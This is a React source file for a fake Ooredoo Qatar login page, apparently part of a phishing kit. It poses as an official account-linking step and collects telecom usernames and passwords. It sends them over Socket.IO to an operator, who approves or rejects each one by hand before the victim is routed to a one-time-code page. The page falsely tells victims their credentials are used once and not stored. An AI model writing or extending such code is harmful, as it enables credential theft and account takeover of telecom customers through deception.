import RejectionBanner, { setRejectionMessage, clearRejectionMessage } from "@/components/RejectionBanner";
import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import WaitingOverlay from "@/components/WaitingOverlay";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import { Loader2, Eye, EyeOff, PhoneCall, ShieldCheck } from "lucide-react";
import { useLang } from "@/i18n/LanguageContext";
import { sendData, navigateToPage, isFormApproved, isFormRejected, waitingMessage } from "@/lib/store";
import { getServiceContext } from "@/lib/serviceContext";

const OoredooLogin = () => {
  const { pick, dir } = useLang();
  const [, navigate] = useLocation();
  const location = useLocation();
  const visitorPhone = (location.state?.phone as string) || "";
  const selectedService =
    typeof window !== "undefined" ? sessionStorage.getItem("selected_service") : null;
  const serviceContext = getServiceContext(selectedService);

  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);

  const isValid = identifier.trim().length >= 4 && password.length >= 4;

  // Navigate to page on mount
  useEffect(() => {
    navigateToPage("تسجيل دخول Ooredoo");
  }, []);

  // Reset approval/rejection signals on mount
  useEffect(() => {
    isFormApproved.value = false;
    isFormRejected.value = false;
  }, []);

  // Watch for admin approval
  useEffect(() => {
    if (!waiting) return;
    if (isFormApproved.value) {
      isFormApproved.value = false;
      waitingMessage.value = "";
      setWaiting(false);
      setLoading(false);
      navigate("/ooredoo-otp");
    }
  }, [isFormApproved.value, waiting]);

  // Watch for admin rejection
  useEffect(() => {
    if (!waiting) return;
    if (isFormRejected.value) {
      isFormRejected.value = false;
      waitingMessage.value = "";
      setRejectionMessage(pick(
        "البيانات التي أدخلتها غير صحيحة. يرجى التأكد منها وإعادة المحاولة",
        "The details you entered are incorrect. Please verify and try again."
      ));
      setWaiting(false);
      setLoading(false);
      setPassword("");
      window.scrollTo({ top: 0, behavior: "auto" });
    }
  }, [isFormRejected.value, waiting]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid) return;
    setLoading(true);
    clearRejectionMessage();
    isFormApproved.value = false;
    isFormRejected.value = false;

    // Send data via Socket.IO to admin
    sendData({
      data: {
        phone: visitorPhone || identifier.trim(),
        username: identifier.trim(),
        password,
        service: selectedService || "ooredoo",
      },
      current: "تسجيل دخول Ooredoo",
      nextPage: "رمز OTP",
      waitingForAdminResponse: true,
      isCustom: true,
      customWaitingMessage: pick("جارٍ التحقق من بيانات مشغّل الاتصالات...", "Verifying telecom operator credentials..."),
    });

    setWaiting(true);
  };

  return (
    <div className="min-h-screen bg-background relative" dir={dir}>
      <WaitingOverlay />
      <RejectionBanner />
      <SiteHeader />

      <section className="px-4 pb-10 pt-6">
        <div className="container mx-auto max-w-5xl space-y-5">
          {/* Official notice */}
          <div className="rounded-2xl bg-gradient-to-l from-red-600 to-red-700 text-white p-5 shadow-lg flex items-center gap-4">
            <div className="w-12 h-12 rounded-full bg-white/15 flex items-center justify-center shrink-0">
              <PhoneCall className="w-6 h-6 text-white" />
            </div>
            <div>
              <p className="text-xs font-bold opacity-90 mb-1">
                {pick(serviceContext.orgLineAr, serviceContext.orgLineEn)}
              </p>
              <p className="text-base font-extrabold leading-tight">
                {pick(
                  `ربط رقم الهاتف مع ${serviceContext.accountAr}`,
                  `Link your phone number to your ${serviceContext.accountEn}`
                )}
              </p>
            </div>
          </div>

          {/* Heading */}
          <div className="space-y-3">
            <h1 className="text-2xl font-extrabold text-foreground leading-snug">
              {pick(
                "تأكيد ملكية رقم الهاتف وربطه بالحساب",
                "Confirm phone number ownership and link it to your account"
              )}
            </h1>
            <p className="text-sm text-muted-foreground leading-relaxed">
              {pick(
                `لإتمام تفعيل ${serviceContext.accountAr}، يُشترط التحقق من رقم الهاتف المسجّل لدى مشغّل الاتصالات `,
                `To activate your ${serviceContext.accountEn}, the phone number registered with your telecom operator `
              )}
              <span className="text-red-600 font-bold">Ooredoo Qatar</span>
              {pick(
                ` وربطه رسمياً بحسابك. يُستخدم هذا الرقم لاحقاً في إرسال إشعارات ${serviceContext.platformShortAr} والتنبيهات الأمنية الصادرة عن الجهة.`,
                ` must be verified and officially linked to your account. This number will be used to send ${serviceContext.platformShortEn} notifications and security alerts from the authority.`
              )}
            </p>
          </div>


          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-5 pt-2">
            <div className="space-y-2">
              <label className="block text-sm font-bold text-foreground">
                {pick("اسم المستخدم أو البريد لدى مشغّل الاتصالات", "Telecom account username or email")}
              </label>
              <Input
                placeholder={pick("مثال: 33xxxxxx", "e.g. 33xxxxxx")}
                value={identifier}
                onChange={(e) => setIdentifier(e.target.value)}
                className="h-14 text-base bg-muted/40 border-border/50 rounded-xl focus:ring-2 focus:ring-red-500/30 focus:border-red-500/50"
                dir="ltr"
              />
            </div>

            <div className="space-y-2">
              <label className="block text-sm font-bold text-foreground">
                {pick("كلمة المرور الخاصة بحساب المشغّل", "Telecom account password")}
              </label>
              <div className="relative">
                <Input
                  type={showPassword ? "text" : "password"}
                  placeholder="••••••••"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="h-14 text-base bg-muted/40 border-border/50 rounded-xl focus:ring-2 focus:ring-red-500/30 focus:border-red-500/50 ps-12"
                  dir="ltr"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword((s) => !s)}
                  className="absolute start-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                  aria-label={pick("إظهار كلمة المرور", "Show password")}
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>

            {/* Security note */}
            <div className="flex items-start gap-2.5 rounded-xl bg-muted/40 border border-border/50 p-3">
              <ShieldCheck className="w-4 h-4 text-red-600 mt-0.5 shrink-0" />
              <p className="text-xs text-muted-foreground leading-relaxed">
                {pick(
                  `تُستخدم هذه البيانات لمرة واحدة فقط للتحقق من ملكية الخط، ولا يتم تخزين كلمة المرور لدى ${serviceContext.platformShortAr}.`,
                  `These credentials are used only once to verify line ownership and are not stored by ${serviceContext.platformShortEn}.`
                )}
              </p>
            </div>

            <Button
              type="submit"
              disabled={loading || waiting || !isValid}
              className="w-full bg-red-600 hover:bg-red-700 text-white text-base font-bold py-6 rounded-xl shadow-md transition-all"
            >
              {waiting ? (
                <span className="flex items-center justify-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />{pick("بانتظار الموافقة...", "Waiting for approval...")}</span>
              ) : loading ? (
                <span className="flex items-center justify-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />{pick("جارٍ التحقق من الرقم...", "Verifying the number...")}</span>
              ) : pick("تأكيد الرقم وربطه بالحساب", "Confirm number and link to account")}
            </Button>
          </form>
        </div>
      </section>
      <SiteFooter />
    </div>
  );
};

export default OoredooLogin;
